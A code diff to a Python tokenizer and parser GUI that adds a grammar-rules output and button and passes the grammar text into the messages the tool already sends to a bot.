@@ -17,12 +17,13 @@ SentMessages = []
 # make me funciton to check if this string hsa content other than spaces
 def has_content(string):
     return any(c != ' ' and c != '\n' for c in string)
-def formate_message(inputText, outputTokens, outputSyntax):
+def formate_message(inputText, outputTokens, outputSyntax, outputGrammar):
     if not has_content(inputText): inputText = "Empty input\n"
     if not has_content(outputTokens): outputTokens = "No tokens\n"
     if not has_content(outputSyntax): outputSyntax = "No syntax\n"
+    if not has_content(outputGrammar): outputGrammar = "No grammar\n"
 
-    return f"\n\nInput from {os.getenv("USERNAME")} : `Update-Status: {update_result}`\n```{inputText}\n```\nTokens:\n```\n{outputTokens}\n```\nSyntax:\n```\n{outputSyntax}\n```\n═════════════════════════════════════════════════════════════════════════════════════════════════"
+    return f"\n\nInput from {os.getenv("USERNAME")} : `Update-Status: {update_result}`\n```{inputText}\n```\nTokens:\n```\n{outputTokens}\n```\nSyntax:\n```\n{outputSyntax}\n```\nGrammar:```\n{outputGrammar}```\n═════════════════════════════════════════════════════════════════════════════════════════════════"
 
 
 def send_message_to_bot(message):
@@ -58,9 +59,11 @@ def run_with_timeout(func):
 def main_output(inputText):
     tokens = run_with_timeout(lambda: Tokenizer().tokenize(inputText))
     outputTokens = "\n".join([f"{token.type}: {token.value}" for token in tokens])
-    syntax = run_with_timeout(lambda: Parser(tokens).parse())
+    syntax = run_with_timeout(lambda: Parser(tokens).parse()[0])
     outputSyntax = "\n".join(syntax) if syntax else "Parsing successful"
-    return (outputTokens, outputSyntax)
+    grammar = run_with_timeout(lambda: Parser(tokens).parse()[1])
+    outputGrammar = " -->\n".join(grammar) if grammar else "No grammar found"
+    return (outputTokens, outputSyntax, outputGrammar)
 
 
 # Parse input function
@@ -68,9 +71,9 @@ def parse_input():
     global tests_list, current_test_index
     input_text = gui.get_input_text()
     update_test_list(input_text)
-    tokens_output, syntax_output = main_output(input_text)
+    tokens_output, syntax_output, grammar_output = main_output(input_text)
     gui.set_output_text(syntax_output)
-    send_message_to_bot(formate_message(input_text, tokens_output, syntax_output))
+    send_message_to_bot(formate_message(input_text, tokens_output, syntax_output, grammar_output))
 
 
 # Tokenize input function
@@ -78,10 +81,17 @@ def tokenize_input():
     global tests_list, current_test_index
     input_text = gui.get_input_text()
     update_test_list(input_text)
-    tokens_output, syntax_output = main_output(input_text)
+    tokens_output, syntax_output, grammar_output = main_output(input_text)
     gui.set_output_text(tokens_output)
-    send_message_to_bot(formate_message(input_text, tokens_output, syntax_output))
+    send_message_to_bot(formate_message(input_text, tokens_output, syntax_output, grammar_output))
 
+def get_grammar_rules():
+    global tests_list, current_test_index
+    input_text = gui.get_input_text()
+    update_test_list(input_text)
+    tokens_output, syntax_output, grammar_output = main_output(input_text)
+    gui.set_output_text(grammar_output)
+    send_message_to_bot(formate_message(input_text, tokens_output, syntax_output, grammar_output))
 
 # Show next test function
 def show_next_test():
@@ -149,8 +159,8 @@ def update_test_list(new_test):
 
 check_for_updates_async()
 tests_list = read_tests_from_file()
-
-# Initialize GUI
-gui = GUI(tokenize_command=tokenize_input, parse_command=parse_input, clear_command=clear_boxes,
+# Initialize GUI with the new function for the grammar button
+gui = GUI(tokenize_command=tokenize_input, parse_command=parse_input, show_grammar_rules=get_grammar_rules, clear_command=clear_boxes,
           show_next_command=show_next_test, show_previous_command=show_previous_test)
+
 gui.run()
